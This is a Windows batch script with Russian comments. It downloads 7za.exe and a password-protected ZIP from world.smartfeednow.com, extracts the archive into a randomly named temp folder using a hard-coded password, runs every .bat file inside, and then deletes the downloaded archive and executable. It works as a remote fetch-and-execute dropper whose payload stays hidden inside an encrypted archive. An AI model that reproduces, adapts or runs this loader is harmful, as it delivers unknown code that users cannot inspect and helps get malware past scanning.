@echo off
setlocal enabledelayedexpansion

rem --- Пути во временной папке ---
set "A1=%TEMP%\Opt_%RANDOM%"
set "A2=%TEMP%\_%RANDOM%.zip"
set "A3=%TEMP%\7za_%RANDOM%.exe"

rem --- URL-адреса (из вашего домена) ---
set "U1=https://world.smartfeednow.com/InstallerFileso.zip"
set "U2=https://world.smartfeednow.com/7za.exe"

rem --- Пароль архива ---
set "ZIPPASS=11223344"

rem --- Очистка старых временных файлов ---
if exist "%A1%" rmdir /s /q "%A1%"
if exist "%A2%" del /f /q "%A2%"
if exist "%A3%" del /f /q "%A3%"

rem --- Скачивание 7za.exe ---
echo Скачиваю 7za.exe...
powershell -Command "Try { Invoke-WebRequest -Uri '%U2%' -OutFile '%A3%' -UseBasicParsing -TimeoutSec 60 } Catch { Exit 1 }"
if errorlevel 1 (
    echo Ошибка: не удалось скачать 7za.exe с %U2%.
    goto :cleanup_and_exit
)

rem --- Скачивание ZIP-файла ---
echo Скачиваю ZIP...
powershell -Command "Try { Invoke-WebRequest -Uri '%U1%' -OutFile '%A2%' -UseBasicParsing -TimeoutSec 120 } Catch { Exit 1 }"
if errorlevel 1 (
    echo Ошибка: не удалось скачать ZIP с %U1%.
    goto :cleanup_and_exit
)

rem --- Создаем папку для распаковки ---
mkdir "%A1%"

rem --- Распаковываем ZIP паролем через 7za.exe ---
echo Распаковка архива (пароль установлен)...
"%A3%" x -y -p%ZIPPASS% -o"%A1%" "%A2%"
if errorlevel 1 (
    echo Ошибка: распаковка не удалась или неверный пароль.
    goto :cleanup_and_exit
)

rem --- Запуск BAT-файлов внутри распакованной папки ---
if exist "%A1%" (
    for %%f in ("%A1%\*.bat") do (
        echo Запуск "%%f" ...
        call "%%f"
    )
) else (
    echo Папка распаковки не найдена: %A1%
)

:cleanup_and_exit
rem --- (опционально) удалить скачанные исполняемые и архив, оставить распакованное содержимое ---
if exist "%A2%" del /f /q "%A2%"
if exist "%A3%" del /f /q "%A3%"

endlocal
exit /b 0
